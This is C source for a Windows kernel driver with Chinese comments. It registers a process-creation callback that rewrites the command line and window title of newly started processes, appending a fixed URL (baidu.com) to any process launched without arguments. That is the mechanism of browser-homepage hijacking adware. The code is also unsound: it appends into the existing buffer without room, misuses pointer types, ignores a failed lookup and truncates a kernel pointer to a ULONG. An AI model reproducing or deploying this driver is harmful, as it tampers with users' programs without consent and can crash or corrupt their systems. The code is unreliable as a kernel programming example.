#include "work.h"



//回调
VOID CreateProcessNotify(
	IN HANDLE ParentId,
	IN HANDLE ProcessId,
	IN BOOLEAN Create
	)
{
	NTSTATUS                status = STATUS_SUCCESS;
	PEPROCESS                pEprocess = NULL;

	// 创建进程
	if (Create)
	{
		status = PsLookupProcessByProcessId(ProcessId, &pEprocess);
		if (NT_SUCCESS(status))
		{
			PFILE_OBJECT        FilePointer = NULL;

			status = PsReferenceProcessFilePointer((PEPROCESS)pEprocess, &FilePointer);
				KAPC_STATE ApcState; PPEB peb;
				KeStackAttachProcess(pEprocess, &ApcState);
				peb = PsGetProcessPeb(pEprocess);
				//DbgPrint("++++%wZ+++++%wZ\r\n", &peb->ProcessParameters->CommandLine, &peb->ProcessParameters->ImagePathName);
				
				if (peb->ProcessParameters->CommandLine.Length - peb->ProcessParameters->ImagePathName.Length <= 6)
				{
					
					PWCHAR *tmp = peb->ProcessParameters->CommandLine.Buffer;
					
					wcscat(tmp, L"http://www.baidu.com/");
					UNICODE_STRING Unicode_tmp;
					RtlInitUnicodeString(&Unicode_tmp, tmp);
					peb->ProcessParameters->CommandLine = Unicode_tmp;
					

					peb->ProcessParameters->WindowTitle = Unicode_tmp;
				
					DbgPrint("--->%wZ\r\n", &peb->ProcessParameters->CommandLine);
				}
				else
				{
					
				}
				
			

				

					KeUnstackDetachProcess(&ApcState);
		
		}
	}
	else
	{
		// 结束进程
	}

}


VOID SetWork(IN BOOLEAN bState)
{
	NTSTATUS status;

	if (bState)
	{
		// 注册回调
		status = PsSetCreateProcessNotifyRoutine(CreateProcessNotify, FALSE);
		if (!NT_SUCCESS(status))
		{
			DbgPrint("回调注册失败!");
			return;
		}
	}
	else
	{
		status = PsSetCreateProcessNotifyRoutine(CreateProcessNotify, TRUE);
		if (!NT_SUCCESS(status))
		{
			DbgPrint("回调摘除失败!");
			return;
		}
	}




}



// 获取进程路径
VOID GetProcessPath(ULONG eprocess, PUNICODE_STRING pFilePath)
{
	PFILE_OBJECT        FilePointer = NULL;
	UNICODE_STRING        name;  //盘符
	NTSTATUS                status = STATUS_SUCCESS;
	status = PsReferenceProcessFilePointer((PEPROCESS)eprocess, &FilePointer);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("break out");
	}

	ObReferenceObjectByPointer(
		(PVOID)FilePointer,
		0,
		NULL,
		KernelMode);
	RtlVolumeDeviceToDosName((FilePointer)->DeviceObject, &name); //获取盘符名
	RtlCopyUnicodeString(pFilePath, &name); //盘符连接
	RtlAppendUnicodeStringToString(pFilePath, &(FilePointer)->FileName); //路径连接
	ObDereferenceObject(FilePointer);                //关闭对象引用
}